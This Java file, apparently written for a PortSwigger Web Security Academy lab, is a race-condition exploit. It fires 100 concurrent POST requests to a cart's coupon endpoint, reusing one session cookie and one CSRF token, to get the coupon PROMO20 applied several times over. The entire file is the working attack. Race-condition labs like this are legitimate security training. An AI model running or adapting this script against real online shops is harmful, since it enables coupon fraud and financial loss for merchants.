import java.net.URI;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.stream.IntStream;

public class Scratch {

    public static void main(String[] args) {
        String url = "https://0a1300b2048b118480d98f6900bc00d8.web-security-academy.net/cart/coupon";
        String payload = "csrf=9QrQwIuApVp6eBSH4psj573CoLZiOw4I&coupon=PROMO20";
        int numRequests = 100; // Number of concurrent requests
        int threadPoolSize = 50; // Adjust the thread pool size based on your needs

        // Create a fixed thread pool
        ExecutorService executorService = Executors.newFixedThreadPool(threadPoolSize);

        // Send requests concurrently
        IntStream.range(0, numRequests).forEach(i -> executorService.submit(() -> sendPostRequest(url, payload)));

        // Shutdown the executor service
        executorService.shutdown();
    }

    private static void sendPostRequest(String url, String payload) {
        try {
            // Create HTTP client
            HttpClient client = HttpClient.newHttpClient();

            // Create HTTP request
            HttpRequest request = HttpRequest.newBuilder()
                    .uri(URI.create(url))
                    .header("Host", "0a1300b2048b118480d98f6900bc00d8.web-security-academy.net")
                    .header("Connection", "keep-alive")
                    .header("Cache-Control", "max-age=0")
                    .header("sec-ch-ua", "\"Google Chrome\";v=\"131\", \"Chromium\";v=\"131\", \"Not_A Brand\";v=\"24\"")
                    .header("sec-ch-ua-mobile", "?0")
                    .header("sec-ch-ua-platform", "\"Windows\"")
                    .header("Origin", "https://0a1300b2048b118480d98f6900bc00d8.web-security-academy.net")
                    .header("Content-Type", "application/x-www-form-urlencoded")
                    .header("Upgrade-Insecure-Requests", "1")
                    .header("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36")
                    .header("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7")
                    .header("Sec-Fetch-Site", "same-origin")
                    .header("Sec-Fetch-Mode", "navigate")
                    .header("Sec-Fetch-User", "?1")
                    .header("Sec-Fetch-Dest", "document")
                    .header("Referer", "https://0a1300b2048b118480d98f6900bc00d8.web-security-academy.net/cart")
                    .header("Accept-Language", "en-US,en;q=0.9")
                    .header("Cookie", "session=ziFvAZ9KioBESalyrYaNyM68f4Z01ada")
                    .POST(HttpRequest.BodyPublishers.ofString(payload))
                    .build();

            // Send request and print response
            HttpResponse<String> response = client.send(request, HttpResponse.BodyHandlers.ofString());
            System.out.println("Response Code: " + response.statusCode() + ", Response Length: " + response.body().length());
        } catch (Exception e) {
            System.err.println("Error: " + e.getMessage());
        }
    }
}
